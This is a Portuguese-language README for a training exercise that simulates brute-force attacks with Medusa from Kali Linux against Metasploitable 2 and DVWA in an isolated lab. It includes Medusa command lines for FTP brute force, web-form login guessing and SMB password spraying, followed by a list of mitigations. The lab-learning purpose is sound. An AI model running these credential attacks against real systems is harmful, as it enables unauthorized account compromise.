# 🔐 Projeto: Simulação de Ataques de Força Bruta com Medusa

## 📖 Descrição
Este projeto foi desenvolvido como parte do desafio da DIO, utilizando **Kali Linux** e **Medusa** para simular ataques de força bruta em ambientes vulneráveis (Metasploitable 2 e DVWA).  
O objetivo é compreender como funcionam ataques de força bruta, documentar os processos e propor medidas de mitigação.

---

## ⚙️ Ambiente
- **VirtualBox** com rede Host-Only
- **Kali Linux** (máquina atacante)
- **Metasploitable 2** (máquina alvo)
- **DVWA** (aplicação web vulnerável)

📌 *Justificativa*: O ambiente foi configurado em rede isolada para garantir segurança e controle dos testes.

---

## 🛠️ Cenários Testados
1. **FTP (Metasploitable 2)**  
   - Ataque de força bruta com Medusa.
   - Exemplo de comando:
     ```bash
     medusa -h 192.168.56.101 -u admin -P wordlist.txt -M ftp
     ```

2. **DVWA (Web Form)**  
   - Automação de tentativas de login em formulário web.
   - Exemplo de comando:
     ```bash
     medusa -h 192.168.56.102 -u admin -P wordlist.txt -M http -m FORM:/login.php:user=^USER^&pass=^PASS^:F=Login failed
     ```

3. **SMB (Password Spraying)**  
   - Enumeração de usuários com `enum4linux`.
   - Teste de senhas comuns com Medusa:
     ```bash
     medusa -h 192.168.56.103 -U users.txt -p senha123 -M smbnt
     ```

---

## 📂 Estrutura do Repositório
- `README.md` → documentação principal
- `/wordlists` → listas de senhas utilizadas
- `/scripts` → comandos e automações
- `/images` → capturas de tela dos testes

---

## 🧩 Evidências
- Prints dos ataques bem-sucedidos
- Logs de execução
- Validação de acessos obtidos

*(adicione suas imagens na pasta `/images` e referencie aqui com Markdown)*

---

## 🛡️ Mitigações
- Uso de senhas fortes e políticas de complexidade
- Bloqueio de tentativas após X falhas
- Monitoramento de logs e alertas
- Desativação de serviços inseguros (ex.: FTP em produção)
- Configuração de firewall e IDS/IPS

---

## 📌 Conclusão
O projeto demonstrou como ataques de força bruta podem comprometer serviços mal configurados e reforçou a importância de medidas preventivas.  
Além disso, serviu como prática de documentação técnica e uso do GitHub como portfólio.

---

## 👨‍💻 Autor
Projeto desenvolvido como parte do desafio da [Digital Innovation One](https://www.dio.me/).